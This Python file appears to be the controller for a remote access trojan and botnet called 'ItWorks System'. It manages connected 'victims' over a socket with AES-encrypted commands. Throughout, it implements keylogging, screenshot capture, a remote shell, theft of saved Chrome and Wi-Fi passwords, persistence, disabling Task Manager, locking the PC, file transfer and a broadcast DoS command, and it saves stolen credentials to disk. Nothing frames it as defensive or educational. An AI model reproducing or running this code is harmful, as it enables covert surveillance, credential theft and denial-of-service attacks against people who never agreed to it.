from __future__ import absolute_import
import socket
import threading, json
import time
import sys
from queue import Queue
import struct
import signal
import os, base64
from Crypto.Cipher import AES
import socket
import base64
import os

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()

COMMANDS1 = {u'help':[u'Shows this help'],
            u'screenshot':[u'Grabs screenshot from the victim'],
            u'cmd':[u'Getting a direct shell'],
            u'find av':[u'Finds the installed AVs'],
            u'keystart':[u'Starts Key logger'],
            u'keystop':[u'Stops Key logger'],
            u'keydump':[u'Dumps the result of the keylogger session '],
            u'get wifi passwords':[u'Dumps saved network passwords'],
            u'dump chrome passwords':[u'Dumps saved chrome passwords'],
            u'persistence':[u'Enable persistence mode'],
            u'ps list':[u'Prints the running processes'],
            u'services list':[u'Prints the running services'],
            u'kill PID':[u'Kills running proccess'],
            u'taskman enable or disable':[u'Disables or Enables task manager'],
            u'download file_path':[u'Downloads file from the user, this feature works after running cmd command'],
            u'upload URL':[u'Uploads file to the user, this feature works after running cmd command'],
            u'Lock':[u'locks victim PC'],
            u'back':[u'Go back to main server panel'],
           }


COMMANDS = {u'help':[u'Shows this help'],
            u'list':[u'Lists connected clients'],
            u'select':[u'Selects a client by its index. Takes index as a parameter'],
            u'quit':[u'Stops current connection with a client. To be used when client is selected'],
            u'shutdown':[u'Shuts server down'],
           }

global counter
global key
counter = "H"*16 
key = "H"*32
def encrypt( message):
    encrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
    return encrypto.encrypt(message)

def decrypt( message):
    decrypto = AES.new(key, AES.MODE_CTR, counter=lambda:counter)
    return  decrypto.decrypt(message) 
	
class MultiServer(object):

		

    def __init__(self):
        #self.host = u'localhost'
        self.host = u'127.0.0.1'
        self.port = 8000
        self.socket = None
        self.all_connections = []
        self.all_addresses = []
    def help_command(self):
        for command, dec in COMMANDS1.items():
            print (u"{0} :\n{1}".format(command, dec[0]))
            print (" ------------------------------------- ")
        return
    def print_help(self):
        for cmd, v in COMMANDS.items():
            print (u"{0}:\t{1}".format(cmd, v[0]))
        return

    def register_signal_handler(self):
        signal.signal(signal.SIGINT, self.quit_gracefully)
        signal.signal(signal.SIGTERM, self.quit_gracefully)
        return

    def quit_gracefully(self, signal=None, frame=None):
        print (u'\n[++] Quitting gracefully')
        for conn in self.all_connections:
            try:
                conn.shutdown(2)
                conn.close()
            except Exception as e:
                print( u'\n[++] Could not close connection %s' % str(e))
                # continue
        self.socket.close()
        sys.exit(0)

    def socket_create(self):
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        except socket.error as msg:
            print( u"\n[--] Socket creation error: " + str(msg))
            # TODO: Added exit
            sys.exit(1)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        return

    def socket_bind(self):
        u""" Bind socket to port and wait for connection from client """
        try:
            self.socket.bind((self.host, self.port))
            self.socket.listen(5)
            print ("\n[++] We have started listening, IP: " + str(self.host) + ", Port: " + str(self.port) + "\n ")
        except socket.error as e:
            print( u"n[--] Socket binding error: " + str(e))
            time.sleep(5)
            self.socket_bind()
        return

    def accept_connections(self):
        u""" Accept connections from multiple clients and save to list """
        for c in self.all_connections:
            c.close()
        self.all_connections = []
        self.all_addresses = []
        while 1:
            try:
                conn, address = self.socket.accept()
                conn.setblocking(1)
                client_hostname = conn.recv(1024)
                address = address + (client_hostname.decode(),)
            except Exception as e:
                print (u'\n[--] Error accepting connections: %s' % str(e))
                # Loop indefinitely
                continue
            self.all_connections.append(conn)
            self.all_addresses.append(address)
            print( u'\n[++] Connection has been established: {0} ({1})'.format(address[-1].encode("utf-8"), address[0]))
            persistence_mode = decrypt(conn.recv(1024))
            print( " \n " + str(persistence_mode.strip('[""]')) + " \n")
        return
##--- Attack, army! (UDP)
    def dos(self, cmd,con,i):
        encrypted_msg = encrypt(cmd)
        con.send(encrypted_msg)

    def ddos(self,cmd):
        threads = []
        countcon = 0
        
        for i, con in enumerate(self.all_connections):
            try:
                t = threading.Thread(target=self.dos,args=([cmd,con,i]))
                threads.append(t)
                countcon+=1
            except Exception as e:
                print ("[--] Unable to create threads: " + str(e))
                
        for thread in threads:
            try:
                thread.start()
                thread.join()
            except Exception as e:
                print ("[--] Unable to run threads: " + str(e))
        client_response= con.recv(1024)

        resultcount=0
        while resultcount<countcon:
            a = decrypt(client_response)
            print(a)
            resultcount+=1
##-------    
    def main_server(self):
        u""" Interactive prompt for sending commands remotely """
        while True:
            cmd = input(u'Server> ')
            if cmd == u'list':
                self.list_connections()
                continue
            elif u'select' in cmd:
                target, conn = self.get_target(cmd)
                if conn is not None:
                    self.send_target_commands(target, conn)
            elif cmd == u'shutdown':
                    queue.task_done()
                    queue.task_done()
                    print (u'\n[++] Server shutdown')
                    break
                    # self.quit_gracefully()
            elif 'dos' in cmd:
                self.ddos(cmd)
            elif cmd == u'help':
                self.print_help()
            elif cmd == u'':
                pass
            else:
                print (u'[--] Command not recognized ')
        return

    def list_connections(self):
        results = u''
        for i, conn in enumerate(self.all_connections):
            try:
                conn.send(encrypt(" "))
                conn.recv(204800)
				
            except:
                del self.all_connections[i]
                del self.all_addresses[i]
                continue
            results += str(i) + u'   ' + str(self.all_addresses[i][0].encode("utf-8")) + u'   ' + str(self.all_addresses[i][1]) + u'   ' + str(self.all_addresses[i][2]) + u'\n'
        print( u'----- list of Victims -----' + u'\n' + results)
        return

    def get_target(self, cmd):
        u""" Select target client
        :param cmd:
        """
        target = cmd.split(u' ')[-1]
        try:
            target = int(target)
        except:
            print( u'\n [--] Client index should be an integer .. \n')
            return None, None
        try:
            conn = self.all_connections[target]
        except IndexError:
            print (u'\n [--] Not a valid selection \n')
            return None, None
        print( u"\n[++] You are now connected to " + str(self.all_addresses[target][2].encode("utf-8")) + "\n")
        return target, conn

    def send_data(self, data, conn, target):
        #data1 = json.dumps(data)
        encrypted_msg = encrypt(data)
        conn.send(encrypted_msg)
        
        #cmd_output = self.read_command_output(conn)
        client_response= conn.recv(204800)
        a = decrypt(client_response)
        #print str(client_response)
        data_loaded = json.loads(a)		
        for x in  data_loaded:
            print (str(x) + " \n")

    def installed_application(self, data, conn, target):
        encrypted_msg = encrypt(data)
        conn.send(encrypted_msg)
        
        client_response= conn.recv(1024)
        a = decrypt(client_response)
        print( "\n" + str(a) + "\n")
        client_response= conn.recv(204800)
        b = decrypt(client_response)
        data_loaded = json.loads(b)		
        for x in  data_loaded:
            for i in x:

                print (i.encode("utf-8"))
            print (" -------------------------------  ")		

    def send_download(self, data, conn, target):
        #data1 = json.dumps(data)
        conn.send(encrypt(data))
        split = data.split(" ")
        file_name = split[1]
        #client_response = ""
        #cmd_output = self.read_command_output(conn)
        recived_data = decrypt(conn.recv(20480)) 
        buffer = ""
        for i in range(0, len(recived_data)):
            if recived_data[i].isdigit():
                buffer += recived_data[i]
        try:
            buffer = int(buffer)
            print( str(recived_data))
        except:
            print( str(recived_data))
            self.send_target_commands(target, conn)
			
        while True:
            data = decrypt(conn.recv(buffer + 100))
            if data == " \n [--] We could not download directory ... ":
                print (data)
                break
            else:
                sc = open(file_name, "wb")
                sc.write(data)
                print( " \n [++] We have successfully downloaded the file .. ")
                break
        return

    def get_shell(self, data, conn, target):
        print ("\n [++] Type quit if you want go back .. \n")
        conn.send(encrypt(str(data)))
        resp = decrypt(conn.recv(20480))
        print (resp)
        while True:
            cm = raw_input()
			
            if cm[:8] == "download":
                self.send_download(cm, conn, target)
                continue				
            elif len(str(cm)) > 0:
                conn.send(encrypt(str(cm)))
                asf =  decrypt(conn.recv(20480))
                if asf == "quit":
                    break
                print (asf )
                continue
            else:
                continue
        self.send_target_commands(target, conn)
    def request_screenshot(self, data, conn, target):
        conn.send(decrypt(data))
        recived_data = decrypt(conn.recv(20480))
        if recived_data != "[--] Error":
            print (str(recived_data))
        #continue
            buffer = ""
            for i in range(0, len(recived_data)):
                if recived_data[i].isdigit():
                    buffer += recived_data[i]
            try:
                if len(buffer) > 0:
                    buffer = int(buffer)
                    while True:
                        screen_file = time.strftime("saved/screenshots/%Y%m%d%H%M%S" + ".png")
                        data = decrypt(conn.recv(buffer))
                        sc = open(screen_file, "wb")
                        sc.write(data)
                        
                        print (" [++] We have received and saved the screenshot :  " + str(os.getcwd()) + str("\ ") + str(screen_file))
                        break
                else:
                    print( " \n [++]  There is no sent screenshot by the client ... ")
             
            except:
                print (" [--] The PC migiht be on Sleep Mode . ")
        else:
            print (" [--] There was an error grapping the screenshot, pls try again .. ")
        
    def send_normal_data(self, data, conn, target):
        conn.send(encrypt(data))
        recived_data = decrypt(conn.recv(20480))
        print (recived_data)
    def send_services_data(self, data, conn, target):
        encrypted_msg = encrypt(data)
        conn.send(encrypted_msg)
    
        client_response= conn.recv(204800)
        a = decrypt(client_response)
        data_loaded = json.loads(a)		
        for x in  data_loaded:
            print (str(x))
        try:
            f_name = time.strftime("saved/services/%Y%m%d%H%M%S" + ".txt")
            op = open((f_name), "w")
            for x in data_loaded:
                op.write(str(x) + " \n" ) 
        
            print ("\n [++] All gathered services are saved " + str(f_name) + " \n"	)
        except Exception as e:
            print ("\n [--] There was an error writing the result to the file due to :   " +  str(e) + " \n")
			
    def key_logger(self, action, conn, target):
        if action == "keystart":
            conn.send(encrypt(action))
            print (str(decrypt(conn.recv(2048))))
        elif action == "keystop":
            conn.send(encrypt(action))
            print (str(decrypt(conn.recv(2048))))
        elif action == "keydump":
            conn.send(encrypt(action))
            buffer = decrypt(conn.recv(2048))
            if buffer == " \n [--] There is an error dumpping ..":
                print( str(buffer))
            elif buffer == " \n [--] it is empty ..":
                print( str(buffer))
            else:
                logs = decrypt(conn.recv(int(buffer)))
                print (str(logs))
    def send_passwords_data(self, data, conn, target):
        encrypted_msg = encrypt(data)
        conn.send(encrypted_msg)
    
        client_response= conn.recv(204800)
        a = decrypt(client_response)
        data_loaded = json.loads(a)		
        for x in  data_loaded:
            print (str(x))
        try:
            f_name = time.strftime("saved/passwords/%Y%m%d%H%M%S" + ".txt")
            op = open((f_name), "w")
            for x in data_loaded:
                op.write(str(x) + " \n" ) 
        
            print ("\n [++] All gathered passwords are saved " + str(f_name) + " \n")
        except Exception as e:
            print ("\n [--] There was an error writing the result to the file due to :   " +  str(e) + " \n")	
			

    def send_target_commands(self, target, conn):

        while True:
            try:
                cmd = raw_input("Server>Command> ")
                #if cmd == u'quit':
                    #break
                if cmd == "info":
                    self.send_data(cmd, conn, target)
                elif cmd == "network":
                    self.send_data(str(cmd), conn, target) 
					
                elif cmd == "ps list":
                    self.send_data(str(cmd), conn, target)

                elif cmd == "sysinfo":
                    self.send_data(str(cmd), conn, target) 					
                    continue
                elif "kill" in cmd:
                    try:
                        psid = int(cmd.split(" ")[-1])
                        self.send_data(str(cmd), conn, target)
                    except:
                        print (" [--] Invalid input \n ")
                elif cmd == "dump chrome passwords" :
                        self.send_passwords_data(str(cmd), conn, target)
                elif cmd == "keystart":
                        self.key_logger(str(cmd), conn,target)
                elif cmd == "keystop":
                        self.key_logger(str(cmd), conn,target)
                elif cmd == "keydump":
                        self.key_logger(str(cmd), conn,target)	
                elif cmd == "cmd":
                        self.get_shell(str(cmd), conn,target)
                elif cmd == "persistence":
                        self.send_data(str(cmd), conn, target)
                elif cmd == "get wifi passwords":
                    self.send_data(str(cmd), conn, target) 
                elif cmd == "screenshot":
                    self.request_screenshot(str(cmd), conn, target)				
                elif cmd == "lock":
                    self.send_normal_data(str(cmd), conn, target)				
                elif cmd == "programs list":
                    self.installed_application(str(cmd), conn, target)
                elif cmd == "taskman enable" or cmd == "taskman disable":
                    self.send_data(str(cmd), conn, target)
                elif cmd == "find av":
                    self.send_data(str(cmd), conn, target)
                elif cmd == "services list":
                    self.send_services_data(str(cmd), conn, target)
                elif cmd == "back":
                    break
                elif cmd == "help":
                    self.help_command()
                else:
                    print ("\n[--] Unrecognized command, please check the help command ..."	)		
            except Exception as e:
                print (u"Connection was lost %s" %str(e))
                break
                #pass 
        #del self.all_connections[target]
        #del self.all_addresses[target]
        return


def create_workers():
    server = MultiServer()
    server.register_signal_handler()
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work, args=(server,))
        t.daemon = True
        t.start()
    return


def work(server):

    while True:
        x = queue.get()
        if x == 1:
            server.socket_create()
            server.socket_bind()
            server.accept_connections()
        if x == 2:
            server.main_server()
        queue.task_done()
    return

def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()
    return

def main():
    create_workers()
    create_jobs()


if __name__ == u'__main__':
    print ( "\n \n -------------------------------------------------------------------------------")
    print ( "                                                                                     ")
    print ("                                 ItWorks System                                      ")
    print ("                                                                                     ")
    print (" -------------------------------------------------------------------------------\n\n ")
    main()
